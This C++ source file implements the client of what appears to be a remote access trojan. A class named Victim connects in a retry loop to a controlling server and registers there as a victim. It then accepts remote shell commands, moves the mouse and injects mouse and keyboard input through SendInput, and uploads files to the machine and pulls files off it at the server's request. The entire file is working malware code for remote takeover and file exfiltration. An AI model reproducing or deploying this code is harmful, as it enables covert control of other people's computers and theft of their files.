#include "victim.hpp"
#include <thread>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <SFML/Window.hpp>
#include <Windows.h>
#include "../commands.hpp"

Victim::Victim(std::string inHId)
	:
	myHId(inHId)
{
}

int Victim::runProcess()
{
	while (!connectServer())
		sf::sleep(sf::seconds(5));

	bool isSendingPing = true;
	std::thread pingThread([&] {
		while (isSendingPing) {
			sf::sleep(sf::seconds(3));			
			
			sf::Packet p;
			p << uint16_t(0) << uint8_t(Cmd::PING);
			auto _ = server.send(p);
		}
		});

	while (true) {
		sf::Packet p;
		auto status = server.receive(p);

		if (status == sf::Socket::Status::Disconnected)
			break;
		if (status != sf::Socket::Status::Done) {
			sf::sleep(sf::milliseconds(100));
			continue;
		}
 
		uint16_t reqId = 0;
		uint8_t cmd;
		p >> reqId >> cmd;

		//start ssh session
		if (cmd == uint8_t(Cmd::START_SSH)) {
			isSshActive = true;
			std::cout << "start ssh\n";

			std::string msg = " " + std::filesystem::current_path().string() + "> ";
			sf::Packet res;
			res << uint16_t(0) << uint8_t(Cmd::SSH_DATA) << msg;
			auto _ = server.send(res);
		}
		//end ssh session
		else if (cmd == uint8_t(Cmd::END_SSH)) {
			isSshActive = false;
			std::cout << "stop ssh\n";

			destFilePath = "";
			destFileExt = "";
			sendFilePacketsMissing = 0;

			sourceFilePath = "";
			getFilePacketsSent = 0;
		}
		//receive ssh data
		else if (cmd == uint8_t(Cmd::SSH_DATA)) {
			std::string data;
			p >> data;

			std::string msg = data + "\n";
			try {
				msg += processCommand(data);
			}
			catch (const std::exception& e) {
				msg += std::string(e.what()) + "\n";
			}
			msg += " " + std::filesystem::current_path().string() + "> ";

			sf::Packet res;
			res << uint16_t(0) << uint8_t(Cmd::SSH_DATA) << msg;
			auto _ = server.send(res);
		}
		//receive mouse position data
		else if (cmd == uint8_t(Cmd::SSH_MOUSE_POS)) {
			uint16_t rx, ry;
			p >> rx >> ry;

			auto size = sf::VideoMode::getDesktopMode().size;
			int x = std::round((rx * size.x) / float(UINT16_MAX - 1));
			int y = std::round((ry * size.y) / float(UINT16_MAX - 1));

			SetCursorPos(x, y);
		}
		//receive mouse button press
		else if (cmd == uint8_t(Cmd::SSH_MOUSE_PRESS)) {
			uint8_t i;
			p >> i;

			INPUT in;
			in.type = INPUT_MOUSE;
			in.mi.time = 0;
			in.mi.mouseData = 0;

			if (i == 1)
				in.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
			else if (i == 2)
				in.mi.dwFlags = MOUSEEVENTF_RIGHTDOWN;
			else if (i == 3)
				in.mi.dwFlags = MOUSEEVENTF_MIDDLEDOWN;
			else if (i == 4 || i == 5)
			{
				in.mi.dwFlags = MOUSEEVENTF_XDOWN;
				if (i == 4)
					in.mi.mouseData = XBUTTON1;
				else
					in.mi.mouseData = XBUTTON2;
			}

			SendInput(1, &in, sizeof(INPUT));
		}
		//receive mouse button release
		else if (cmd == uint8_t(Cmd::SSH_MOUSE_RELEASE)) {
			uint8_t i;
			p >> i;

			INPUT in;
			in.type = INPUT_MOUSE;
			in.mi.time = 0;
			in.mi.mouseData = 0;

			if (i == 1)
					in.mi.dwFlags = MOUSEEVENTF_LEFTUP;
			else if (i == 2)
					in.mi.dwFlags = MOUSEEVENTF_RIGHTUP;
			else if (i == 3)
					in.mi.dwFlags = MOUSEEVENTF_MIDDLEUP;
			else if (i == 4 || i == 5)
			{
				in.mi.dwFlags = MOUSEEVENTF_XUP;
				if (i == 4)
					in.mi.mouseData = XBUTTON1;
				else
					in.mi.mouseData = XBUTTON2;
			}

			SendInput(1, &in, sizeof(INPUT));
		}
		//receive mouse wheel scroll
		else if (cmd == uint8_t(Cmd::SSH_MOUSE_SCROLL)) {
			int16_t delta;
			p >> delta;

			INPUT input;
			input.type = INPUT_MOUSE;
			input.mi.dx = 0;
			input.mi.dy = 0;
			input.mi.mouseData = delta;
			input.mi.dwFlags = MOUSEEVENTF_WHEEL;
			input.mi.time = 0;
			input.mi.dwExtraInfo = 0;

			SendInput(1, &input, sizeof(INPUT));
		}
		//receive keyboard press
		else if (cmd == uint8_t(Cmd::SSH_KEYBOARD_PRESS)) {
			uint8_t i;
			p >> i;

			INPUT input;
			input.type = INPUT_KEYBOARD;
			input.ki.wVk = i;
			input.ki.dwFlags = 0;

			SendInput(1, &input, sizeof(INPUT));
		}
		//receive keyboard release
		else if (cmd == uint8_t(Cmd::SSH_KEYBOARD_RELEASE)) {
			uint8_t i;
			p >> i;

			INPUT input;
			input.type = INPUT_KEYBOARD;
			input.ki.wVk = i;
			input.ki.dwFlags = KEYEVENTF_KEYUP;

			SendInput(1, &input, sizeof(INPUT));
		}
		
		else if (cmd == uint8_t(Cmd::SSH_START_SENDING_FILE)) {
			uint32_t n;
			std::string path;
			p >> n >> path;

			if (path.find_last_of('.') != std::string::npos) {
				destFilePath = path.substr(0, path.find_last_of('.'));
				destFileExt = path.substr(path.find_last_of('.'));
			}
			else {
				destFilePath = path;
				destFileExt = "";
			}

			sf::Packet res;
			res << uint16_t(reqId) << uint8_t(Cmd::SSH_START_SENDING_FILE);
			std::ofstream file(destFilePath);
			if (file.good()) {
				sendFilePacketsMissing = n;
				res << true;
			}
			else {
				destFileExt = "";
				destFilePath = "";
				sendFilePacketsMissing = 0;
				res << false;
			}

			auto _ = server.send(res);
		}
		else if (cmd == uint8_t(Cmd::SSH_SEND_FILE_DATA)) {
			if (destFilePath == "")
				continue;

			const void* buffer = p.getData();
			auto data = static_cast<const char*>(buffer);
			data += 3;
			size_t size = p.getDataSize() - 3;

			std::ofstream file(destFilePath, std::ios::app | std::ios::binary);
			if (file.write(data, size)) {
				sf::Packet res; 
				res << reqId << uint8_t(Cmd::SSH_SEND_FILE_DATA);
				auto _ = server.send(res);
				
				sendFilePacketsMissing--;
				if (sendFilePacketsMissing == 0) {
					file.close();
					auto _ = std::rename(destFilePath.c_str(), (destFilePath + destFileExt).c_str());

					destFileExt = "";
					destFilePath = "";
				}
			}
			else {
				destFileExt = "";
				destFilePath = "";
				sendFilePacketsMissing = 0;
			}
		}
		else if (cmd == uint8_t(Cmd::SSH_START_GETTING_FILE)) {
			getFilePacketsSent = 0;
			p >> sourceFilePath;
			sf::Packet res;
			res << reqId << uint8_t(Cmd::SSH_START_GETTING_FILE);

			//check if source file is valid
			std::ifstream file(sourceFilePath, std::ifstream::ate | std::ifstream::binary);
			auto size = file.tellg();
			if (size == -1) {
				res << uint32_t(0);
				sourceFilePath = "";
			}
			else
				res << uint32_t(std::ceil(size / long double(packetSize)));

			auto _ = server.send(res);
		}
		else if (cmd == uint8_t(Cmd::SSH_GET_FILE_DATA)) {
			if (sourceFilePath == "")
				continue;

			std::ifstream file(sourceFilePath, std::ios::binary);
			file.seekg(getFilePacketsSent * packetSize);
			std::unique_ptr<char[]> buffer(new char[packetSize]());
			file.read(buffer.get(), packetSize);

			size_t bytesRead = file.gcount();
			if (bytesRead <= 0) {
				sourceFilePath = "";
				getFilePacketsSent = 0;
				continue;
			}
			getFilePacketsSent++;

			sf::Packet res;
			res << reqId << uint8_t(Cmd::SSH_GET_FILE_DATA);
			res.append(buffer.get(), bytesRead);
			auto _ = server.send(res);
		}

		//unknown command
		else
			std::cerr << "unknown command received: " << int(cmd) << "\n";
	}

	isSendingPing = false;
	pingThread.join();

	isSshActive = false;
	server.disconnect();

	return 0;
}

bool Victim::connectServer()
{
	//connect to the server
	if (server.connect(serverIp, serverPort) != sf::Socket::Status::Done)
		return false;

	//send the registration request
	sf::Packet req;
	uint16_t reqId = requestId++;
	req << reqId << std::uint8_t(Cmd::REGISTER_VICTIM) << std::string("#v0.0.1#") << myHId;
	if (server.send(req) != sf::Socket::Status::Done) {
		server.disconnect();
		return false;
	}

	sf::Packet res;
	bool waiting = true;
	//receive the initialization response
	const auto receive = [this, &waiting, &res, reqId]() {
		while (waiting) {
			res.clear();
			auto _ = server.receive(res);
			uint16_t resId;
			res >> resId;
			if (resId == reqId)
				waiting = false;
		}
	};

	std::thread receiveThread(receive);
	//wait for initialization response
	for (int i = 0; i < 10; i++) {
		sf::sleep(sf::milliseconds(500));
		if (!waiting)
			break;
	}

	if (waiting) {
		waiting = false;
		server.disconnect();
		receiveThread.join();
		return false;
	}
	receiveThread.join();

	bool success = false;
	res >> success;
	if (!success) {
		server.disconnect();
		return false;
	}

	res >> myId;
	return true;
}

std::string Victim::processCommand(const std::string& cmd) const
{
	std::vector<std::string> param;
	std::string current;
	bool inQuotes = false;
	for (size_t i = 0; i < cmd.size(); ++i) {
		unsigned char c = cmd[i];

		if (c == '"') {
			inQuotes = !inQuotes;
			if (!current.empty()) {
				param.push_back(current);
				current.clear();
			}
			continue;
		}

		if (std::isspace(c) && !inQuotes) {
			if (!current.empty()) {
				param.push_back(current);
				current.clear();
			}
		}
		else
			current += c;
	}

	if (!current.empty())
		param.push_back(current);

	if (param.empty())
		return "";

	if (param[0] == "cd") {
		std::filesystem::current_path(param[1]);
		return "";
	}
	if (param[0] == "ls") {
		std::string output;
		for (const auto& entry : std::filesystem::directory_iterator(".")) {
			output += entry.path().filename().string();

			if (entry.is_directory())
				output += " [DIR]";
			else if (entry.is_regular_file())
				output += " [FILE]";
			output += "\n";
		}
		return output;
	}

	return "unable to process command\n";
}
